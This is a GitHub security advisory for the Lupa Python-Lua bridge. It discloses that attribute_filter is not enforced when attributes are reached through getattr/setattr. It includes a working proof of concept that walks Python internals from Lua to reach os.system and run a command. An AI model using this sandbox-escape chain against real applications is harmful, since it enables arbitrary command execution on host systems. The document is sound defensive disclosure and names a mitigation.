# [H] Lupa has a Sandbox escape and RCE due to incomplete attribute_filter enforcement in getattr / setattr

## Summary
Severity: High
Advisory: GHSA-69v7-xpr6-6gjm
CVE: CVE-2026-34444
CWE: CWE-284, CWE-693
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-69v7-xpr6-6gjm
Type: github-advisory

## Affected
- PyPI: `lupa` — affected >=0

## Details
### Summary
The `attribute_filter` in the Lupa library is intended to restrict access to sensitive Python attributes when exposing objects to Lua.

However, the filter is not consistently applied when attributes are accessed through built-in functions like getattr and setattr. This allows an attacker to bypass the intended restrictions and eventually achieve arbitrary code execution.

### Details
The `attribute_filter` is meant to block access to attributes such as `__class__`, `__mro__`, and similar internal properties.

In practice, it only applies to direct attribute access:
- `obj.attr` → filtered
- `getattr(obj, "attr")` → not filtered
Because of this inconsistency, it’s possible to bypass the filter entirely, if access to the Python builtins is granted to Lua code.

An attacker can use getattr to-
- Access `__class__`
- Walk the `__mro__` chain
- Call `__subclasses__()`
- Iterate over available classes
- Find a function that exposes `__globals__`
- Retrieve something like `os.system`

At that point, arbitrary command execution becomes straightforward.

This effectively breaks the security boundary that `attribute_filter` is expected to enforce.


### PoC
The following example shows how the filter can be bypassed to execute `os.system`:'
```
import lupa
from lupa import LuaRuntime

def protected_attribute_filter(obj, attr_name, is_setting):
    if isinstance(attr_name, str) and attr_name.startswith('_'):
        raise AttributeError(f"Access to '{attr_name}' is forbidden")
    return attr_name

lua = LuaRuntime(unpack_returned_tuples=True, attribute_filter=protected_attribute_filter)

class UserProfile:
    def __init__(self, name): self.name = name

lua.globals().user = UserProfile("test")

lua.execute("""
local py = python.builtins
local getattr = py.getattr
local setattr = py.setattr

local cls = getattr(user, "__class__")
local _, obj_cls = getattr(cls, "__mro__")

local subs = getattr(obj_cls, "__subclasses__")()
for _, c in ipairs(subs) do
    if tostring(c):find("os._wrap_close") then
        local system = getattr(getattr(c, "__init__"), "__globals__")["system"]
        setattr(user, "run", system)
        user.run("id")
    end
end
""")
```


### Impact
An attacker who can execute Lua code can:
- Bypass the `attribute_filter`
- Access Python internals
- Traverse the object graph
- Reach execution primitives

This leads to full sandbox escape and arbitrary command execution in the host Python process.
Any application relying on `attribute_filter` as a security control for untrusted Lua code execution is affected, if it does not also disallow access to the Python builtins via the `register_builtins=False` option.

## References
- https://github.com/scoder/lupa/security/advisories/GHSA-69v7-xpr6-6gjm
- https://nvd.nist.gov/vuln/detail/CVE-2026-34444
- https://github.com/scoder/lupa
